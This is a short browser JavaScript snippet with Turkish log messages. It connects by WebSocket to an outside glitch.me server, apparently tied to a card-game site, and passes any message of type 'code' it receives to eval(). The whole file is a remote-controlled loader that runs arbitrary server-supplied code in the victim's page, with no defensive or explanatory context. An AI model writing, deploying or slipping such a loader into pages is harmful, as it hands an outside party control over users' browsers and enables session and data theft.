(function() {
    if (window.myWebSocket && window.myWebSocket.readyState === WebSocket.OPEN) {
        console.log('WebSocket zaten bağlı, tekrar çalıştırılmadı', 'Zaman:', new Date().toISOString());
        return;
    }

    console.log('Script yüklendi!', 'Zaman:', new Date().toISOString());
    
    const ws = new WebSocket('wss://duello-katiponline-com.glitch.me');

    ws.onopen = () => {
        console.log('WebSocket bağlantısı kuruldu', 'Zaman:', new Date().toISOString());
    };

    ws.onmessage = (event) => {
        const message = JSON.parse(event.data);
        if (message.type === 'code') {
            console.log('Yeni kod alındı:', message.data, 'Zaman:', new Date().toISOString());
            try {
                eval(message.data);
            } catch (e) {
                console.error('Kod çalıştırma hatası:', e.message, 'Zaman:', new Date().toISOString());
            }
        }
    };

    ws.onclose = () => {
        console.log('WebSocket bağlantısı koptu', 'Zaman:', new Date().toISOString());
    };

    ws.onerror = (error) => {
        console.error('WebSocket hatası:', error, 'Zaman:', new Date().toISOString());
    };

    window.myWebSocket = ws;
})();
